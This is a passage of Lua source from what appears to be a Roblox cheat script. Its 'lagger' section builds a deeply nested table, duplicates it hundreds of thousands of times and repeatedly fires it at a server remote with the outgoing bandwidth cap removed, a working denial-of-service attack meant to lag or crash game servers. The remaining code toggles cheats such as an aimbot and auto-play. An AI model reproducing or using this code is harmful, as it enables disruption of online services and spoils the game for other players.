-- ====================== LAGGER FUNCTIONS ======================
local LAGGER_CONFIG = C.isMobile and {
    TableIncrease = 290,
    Tries = 1,
    LoopWaitTime = 0.85
} or {
    TableIncrease = 265,
    Tries = 1,
    LoopWaitTime = 0.05
}
local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if obj then
            obj = obj[segment]
        else
            return nil
        end
    end
    return obj
end

local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then return nil end
    return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = getmaxvalue(tableincrease) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
    if remote then
        for i = 1, tries do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
        end
    end
end

local laggerThread = nil
local function startLaggerLoop()
    while C.Enabled.Lagger do
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        task.spawn(function()
            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
        end)
        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
    end
end

function C.startLagger()
    if laggerThread then return end
    laggerThread = coroutine.create(startLaggerLoop)
    coroutine.resume(laggerThread)
end

function C.stopLagger()
    C.Enabled.Lagger = false
    if laggerThread then
        coroutine.close(laggerThread)
        laggerThread = nil
    end
end

-- Mutual exclusivity helper
function C.enforceMutualExclusivity(activatedKey, newState)
    if not newState then return end
    if activatedKey == "AutoPlayLeftEnabled" then
        if C.Enabled.AutoPlayRightEnabled then C.stopAutoPlayRight(); C.Enabled.AutoPlayRightEnabled = false; if C.VisualSetters.AutoPlayRightEnabled then C.VisualSetters.AutoPlayRightEnabled(false) end end
        if C.Enabled.BatAimbot then C.stopBatAimbot(); C.Enabled.BatAimbot = false; if C.VisualSetters.BatAimbot then C.VisualSetters.BatAimbot(false) end end
        if C.Enabled.AutoWalkEnabled then C.stopAutoWalk(); C.Enabled.AutoWalkEnabled = false; if C.VisualSetters.AutoWalkEnabled then C.VisualSetters.AutoWalkEnabled(false) end end
        if C.Enabled.AutoRightEnabled then C.stopAutoRight(); C.Enabled.AutoRightEnabled = false; if C.VisualSetters.AutoRightEnabled then C.VisualSetters.AutoRightEnabled(false) end end
    end
    if activatedKey == "AutoPlayRightEnabled" then
        if C.Enabled.AutoPlayLeftEnabled then C.stopAutoPlayLeft(); C.Enabled.AutoPlayLeftEnabled = false; if C.VisualSetters.AutoPlayLeftEnabled then C.VisualSetters.AutoPlayLeftEnabled(false) end end
        if C.Enabled.BatAimbot then C.stopBatAimbot(); C.Enabled.BatAimbot = false; if C.VisualSetters.BatAimbot then C.VisualSetters.BatAimbot(false) end end
        if C.Enabled.AutoWalkEnabled then C.stopAutoWalk(); C.Enabled.AutoWalkEnabled = false; if C.VisualSetters.AutoWalkEnabled then C.VisualSetters.AutoWalkEnabled(false) end end
        if C.Enabled.AutoRightEnabled then C.stopAutoRight(); C.Enabled.AutoRightEnabled = false; if C.VisualSetters.AutoRightEnabled then C.VisualSetters.AutoRightEnabled(false) end end
    end
    if activatedKey == "BatAimbot" then
        if C.Enabled.AutoPlayLeftEnabled then C.stopAutoPlayLeft(); C.Enabled.AutoPlayLeftEnabled = false; if C.VisualSetters.AutoPlayLeftEnabled then C.VisualSetters.AutoPlayLeftEnabled(false) end end
        if C.Enabled.AutoPlayRightEnabled then C.stopAutoPlayRight(); C.Enabled.AutoPlayRightEnabled = false; if C.VisualSetters.AutoPlayRightEnabled then C.VisualSetters.AutoPlayRightEnabled(false) end end
    end
end

